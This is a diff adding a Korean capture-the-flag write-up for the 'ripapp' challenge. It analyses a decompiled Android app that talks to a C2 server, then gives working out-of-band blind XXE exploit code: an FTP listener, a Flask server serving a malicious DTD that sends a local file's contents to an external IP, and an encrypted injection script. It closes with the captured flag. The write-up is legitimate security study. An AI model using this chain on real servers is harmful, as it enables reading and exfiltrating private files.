@@ -768,6 +768,8 @@ whitehat2024{6aaff0726bc7fbf8e1becf82f00138ea445b211c12b7dbc7afd53a199c0b70910ab
     
 # ripapp    
       
+ripapp 문제는 C2 서버와 통신하는 apk 파일을 제공해줬다. C2 서버에 취약점을 찾아 플래그를 찾아야한다.  
+
 MainActivity.java      
 ```java 
 package com.example.ripapp2;
@@ -846,3 +848,326 @@ public class MainActivity extends AppCompatActivity {
     }
 }
 ```      
+앱 동작을 살펴보면, `/fsalke2j9sdfcjlz/BSBoQXNxCxOtACCpujH9zMdrCJsl5B`에 요청을 보내 C2 Server와 통신이 가능한지 확인한다. 통신이 가능하다면 `SendData.send("/fsalke2j9sdfcjlz/lh1sy5VXzAL8Qmadn5OOvLP5mheIo5").getJSONArray("list")` 요청을 보내 URL 리스트를 가져오고, `SendData.send((Integer) 0).getJSONArray("list")` 요청을 보내 HTTP Header와 Body 부분을 가져온다.   
+    
+- SendData.send("/fsalke2j9sdfcjlz/lh1sy5VXzAL8Qmadn5OOvLP5mheIo5").getJSONArray("list")
+
+```json
+{
+    "list":[
+        "FAHoezFX3Beuxz46nuZDJSJHxa1XC0",
+        "yQOIIWf3PzTrvh0NdUByunaZZCGTYA",
+        "Rc8AAnDk0myfDAK9QU5aNk2gWG1Tfx",
+        "yWHUOv7if1lqbMCMKfYBOrHS8yrTIA"
+    ]
+}
+```
+
+- SendData.send((Integer) 0).getJSONArray("list")
+
+```json
+{
+  "list": [
+    "\r\nCookie: myapp=myapp\r\n",
+    "Content-Type: application/xml\r\nContent-Length: ",
+    "<?xml version="1.0" encoding="UTF-8"?>\n<root>\n <data>\n  <![CDATA[",
+    "  ]]>\n </data>\n</root>"
+  ]
+}
+```         
+   
+ConfigC2.java   
+```java
+package com.example.ripapp2;
+
+import java.util.ArrayList;
+import java.util.Arrays;
+import org.json.JSONArray;
+import org.json.JSONException;
+
+public class ConfigC2 {
+    public static String addr;
+    public static MyApp app;
+    public static ArrayList<String> body = new ArrayList<>();
+    public static ArrayList<String> head = new ArrayList<>(
+            Arrays.asList(new String[] { "PUT ", " HTTP/1.1\r\nHost: ", "\r\nConnection: close\r\n\r\n" }));
+    public static String port;
+    public static ArrayList<String> urllist = new ArrayList<>();
+
+    public static void setUrllist(JSONArray jSONArray) {
+        int i = 0;
+        while (i < jSONArray.length()) {
+            try {
+                urllist.add(jSONArray.getString(i));
+                i++;
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    public static void setBody(JSONArray jSONArray) {
+        int i = 0;
+        while (i < jSONArray.length()) {
+            try {
+                body.add(jSONArray.getString(i));
+                i++;
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+}
+```   
+앞서 가져온 JSON 데이터는 ConfigC2 클래스의 멤버 변수인 `urllist`, `body`에 저장된다. 
+   
+SendData.java   
+```java
+package com.example.ripapp2;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.Socket;
+import java.util.ArrayList;
+import org.json.JSONObject;
+
+public class SendData {
+    public static JSONObject send(Integer num) {
+        return send("/fsalke2j9sdfcjlz/" + ConfigC2.urllist.get(num.intValue()));
+    }
+
+    public static JSONObject send(Integer num, String str) throws Exception {
+        return send("/fsalke2j9sdfcjlz/" + ConfigC2.urllist.get(num.intValue()), str);
+    }
+
+    public static JSONObject send(String str) { // PATH 
+        ArrayList<String> arrayList = ConfigC2.head;
+        // PUT PATH HTTP/1.1
+        return sock(BuildConfig.HOST, BuildConfig.PORT, arrayList.get(0)/*PUT*/ + str + arrayList.get(1) /*HTTP/1.1*/+ BuildConfig.HOST + arrayList.get(2) /* Connection: close */);
+    }
+
+    public static JSONObject send(String str, String str2) throws Exception {
+        ArrayList<String> arrayList = ConfigC2.head;
+        ArrayList<String> arrayList2 = ConfigC2.body;
+
+        /* <?xml version="1.0" encoding="UTF-8"?>\n<root>\n <data>\n  <![CDATA[ + str + ]]>\n </data>\n</root> */
+        String encrypt = EncData.encrypt(arrayList2.get(2) + str2 + arrayList2.get(3));
+                
+        return sock(BuildConfig.HOST, BuildConfig.PORT, 
+                arrayList.get(0) + str + arrayList.get(1) 
+                + BuildConfig.HOST 
+                + arrayList2.get(0) /* \r\nCookie: myapp=myapp\r\n */
+                + arrayList2.get(1) /* Content-Type: application/xml\r\nContent-Length: */ + encrypt.length() 
+                + arrayList.get(2)  /* Connection: close */ + encrypt);
+    }
+
+    public static JSONObject sock(final String str, final String str2, final String str3) {
+        final JSONObject[] jSONObjectArr = {null};
+        Thread thread = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    StringBuilder sb = new StringBuilder();
+                    Socket socket = new Socket(str, Integer.parseInt(str2));
+                    OutputStream outputStream = socket.getOutputStream();
+                    outputStream.write(str3.getBytes());
+                    outputStream.flush();
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                    while (true) {
+                        String readLine = bufferedReader.readLine();
+                        if (readLine != null) {
+                            sb.append(readLine).append("\n");
+                        } else {
+                            String sb2 = sb.toString();
+                            jSONObjectArr[0] = new JSONObject(EncData.decrypt(sb2.substring(sb2.indexOf("\n\n") + 2).trim()));
+                            bufferedReader.close();
+                            outputStream.close();
+                            socket.close();
+                            return;
+                        }
+                    }
+                } catch (Exception e) {
+                    System.err.println(e);
+                }
+            }
+        });
+        thread.start();
+        try {
+            thread.join();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        return jSONObjectArr[0];
+    }
+}
+```   
+`SendData.send((Integer) 1, MainActivity.this.getDeviceInfo());` 코드는 `MainActivity.java` 파일에서 디바이스 정보를 가져오는 코드이다. 이를 실행하면 어떤 요청이 가는지 `SendData.java` 코드를 분석해봤다.     
+    
+그 결과, `/fsalke2j9sdfcjlz/yQOIIWf3PzTrvh0NdUByunaZZCGTYA` 경로에 주석처리된 부분과 같이 PUT 요청을 보내고 Body에 XML 데이터를 AES 암호화하여 전송하는 것을 알 수 있었다. 그리하여, XXE Injection을 시도해보니 응답 값이 `true`를 반환하였다. 이를 통해, `Blind XXE Injection` 취약점을 이용하는 문제임을 깨달아 External Entity에 웹훅 사이트로 요청을 보내봤다. 하지만, 어떠한 요청도 오지 않았고, 그렇게 삽질을 하다가 대회가 끝났다.    
+     
+대회가 끝나고 보니, 웹훅 사이트가 `https`로 되어있으면 딜레이로 인해 요청이 안온다고 한다...(?)      
+        
+결론적으로, `http`를 사용하는 웹 애플리케이션 서버와 `ftp`서버를 사용해 `Out of band XXE`공격을 시도해주면 `Directory Listing`, `LFI`가 가능하여 플래그를 획득할 수 있다.  
+    
+### Exploit Code      
+    
+#### 1. FTP Server: https://github.com/lc/230-OOB (port: 8000)   
+    
+```python
+#!/usr/bin/env python3
+import socket
+import sys
+import argparse
+
+parser = argparse.ArgumentParser(description='An Out-of-Band XXE tool by Corben Leo')
+parser.add_argument('port',type=int,help="Port for the FTP server to listen on (2121 / 21)")
+args = parser.parse_args()
+
+HOST = ''
+PORT = args.port
+
+welcome = b'220 oob-xxe\n'
+ftp_catch_all_response = b'230 more data please!\n'
+ftp_user_response = b'331 hello world!\n'
+ftp_pass_response = b'230 my password is also hunter2!\n'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def main():
+    try:
+        s.bind((HOST, PORT))
+    except socket.error as msg:
+        print('[+] ERROR: Bind failed. ')
+        sys.exit()
+
+    s.listen(10)
+    print('[+] 230OOB started on port: '+str(PORT))
+
+
+    conn, addr = s.accept()
+    print('[*] Connection from: '+addr[0]+"!")
+    conn.sendall(welcome)
+
+    while True:
+        data = conn.recv(1024)
+        ftp_command = data.split(b" ", 1)
+        response = {
+            'user': ftp_user_response,
+            'pass': ftp_pass_response,
+        }.get(ftp_command[0].lower(), ftp_catch_all_response)
+        conn.sendall(response)
+        line = data.decode('UTF-8')
+        line = line.replace("\n","").replace("CWD","")
+        print(line)
+        extract(line)
+    s.close()
+
+def extract(data):
+        fopen = open('./extracted.log', 'a')
+        fopen.write(data)
+        fopen.close()
+
+try:
+    main()
+except KeyboardInterrupt:
+    s.close()
+```
+      
+#### 2. Web Application Server (port: 7777)         
+
+```python
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/ex.dtd')
+def serve_dtd():
+    dtd_content = '''<!ENTITY % data SYSTEM "file:///flag1423749465164">
+    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://43.201.250.246:8000/%data;'>">%param1;'''
+
+    return Response(dtd_content, content_type='text/xml')
+
+# Flask 서버 실행
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=7777)
+```      
+     
+#### 3. XXE Injection 
+
+```python
+import socket
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad, pad
+import base64 
+
+key = '1234567890123456'    
+iv = '1234567890123456'    
+
+def decrypt(data):
+    global key, iv
+    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
+    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
+    return decrypted_data.decode('utf-8')
+
+def encrypt(data):
+    global key, iv
+    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
+    padded_data = pad(data.encode(), AES.block_size)
+    encrypted = cipher.encrypt(padded_data)
+    encoded = base64.urlsafe_b64encode(encrypted).decode('utf-8').rstrip('=')
+    return encoded
+
+# sock 함수
+def sock(host, port, message):
+    global key, iv
+    try:
+        # 서버에 소켓 연결
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, int(port)))
+            
+            s.sendall(message.encode())
+
+            response = b""
+            while True:
+                chunk = s.recv(1024)
+                if not chunk:
+                    break
+                response += chunk
+            
+            response_str = response.decode('utf-8')
+            print(response_str)
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+
+host = '43.203.207.195'  
+port = '10002'     
+
+body = '<!DOCTYPE data ['
+body += '<!ENTITY % file SYSTEM "file:///flag1423749465164">'
+body += '<!ENTITY % dtd SYSTEM "http://43.201.250.246:7777/ex.dtd">' 
+body += '%dtd;' 
+body += ']>'
+body += '<data>&exfil;</data>' 
+
+enc_body = encrypt(body)
+
+payload = 'PUT /fsalke2j9sdfcjlz/yQOIIWf3PzTrvh0NdUByunaZZCGTYA HTTP/1.1\r\n'
+payload += 'Host: 43.203.207.195\r\n'  
+payload += 'Cookie: myapp=myapp\r\n'
+payload += 'Content-Type: application/xml\r\n'
+payload += 'Content-Length: ' + str(len(enc_body)) + '\r\n' 
+payload += 'Connection: close\r\n\r\n'
+payload += enc_body
+
+response = sock(host, port, payload)
+if response:
+    print("Received data:", response)
+else:
+    print("No response or error occurred.")
+```         
+    
+### Flag    
+whitehat2024{ac637d5e02f48be516ea43a43b3915a446a5d8465cf3867ed2eb4df0b6fae85d63e6bb9efcb56ee0d36771e61dfa344c0bd8}     
+          
